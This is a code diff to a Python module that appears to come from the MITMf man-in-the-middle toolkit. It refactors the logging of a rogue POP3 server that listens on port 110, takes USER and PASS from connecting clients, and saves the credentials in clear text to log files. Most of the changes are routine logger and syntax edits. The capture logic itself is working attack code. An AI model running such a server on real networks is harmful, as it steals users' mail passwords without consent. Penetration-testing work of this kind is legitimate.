@@ -5,20 +5,22 @@ from SocketServer import TCPServer, ThreadingMixIn, BaseRequestHandler
 from core.responder.common import *
 from core.responder.odict import OrderedDict
 from core.responder.packet import Packet
+from core.logger import logger
 
-mitmf_logger = logging.getLogger("mitmf")
+formatter = logging.Formatter("%(asctime)s [POP3server] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+log = logger().setup_logger("POP3server", formatter)
 
-class POP3Server():
+class POP3server():
 
 	def start(self):
 		try:
-			mitmf_logger.debug("[POP3Server] online")
+			log.debug("online")
 			server = ThreadingTCPServer(("0.0.0.0", 110), POP)
-			t = threading.Thread(name="POP3Server", target=server.serve_forever)
+			t = threading.Thread(name="POP3server", target=server.serve_forever)
 			t.setDaemon(True)
 			t.start()
-		except Exception, e:
-			mitmf_logger.error("[POP3Server] Error starting on port {}: {}".format(110, e))
+		except Exception as e:
+			log.error("Error starting on port {}: {}".format(110, e))
 
 class ThreadingTCPServer(ThreadingMixIn, TCPServer):
 
@@ -43,7 +45,7 @@ class POP(BaseRequestHandler):
 			data = self.request.recv(1024)
 			if data[0:4] == "USER":
 				User = data[5:].replace("\r\n","")
-				mitmf_logger.info('[+]POP3 User: %s'%(User))
+				log.info('POP3 User: %s'%(User))
 				t = POPOKPacket()
 				self.request.send(str(t))
 				data = self.request.recv(1024)
@@ -51,7 +53,7 @@ class POP(BaseRequestHandler):
 				Pass = data[5:].replace("\r\n","")
 				Outfile = "./logs/responder/POP3-Clear-Text-Password-"+self.client_address[0]+".txt"
 				WriteData(Outfile,User+":"+Pass, User+":"+Pass)
-				mitmf_logger.info("[POP3Server] POP3 Credentials from {}. User/Pass: {}:{} ".format(self.client_address[0],User,Pass))
+				log.info("POP3 Credentials from {}. User/Pass: {}:{} ".format(self.client_address[0],User,Pass))
 				t = POPOKPacket()
 				self.request.send(str(t))
 				data = self.request.recv(1024)
@@ -60,4 +62,4 @@ class POP(BaseRequestHandler):
 				self.request.send(str(t))
 				data = self.request.recv(1024)
 		except Exception as e:
-			mitmf_logger.error("[POP3Server] Error handling request: {}".format(e))
+			log.error("Error handling request: {}".format(e))
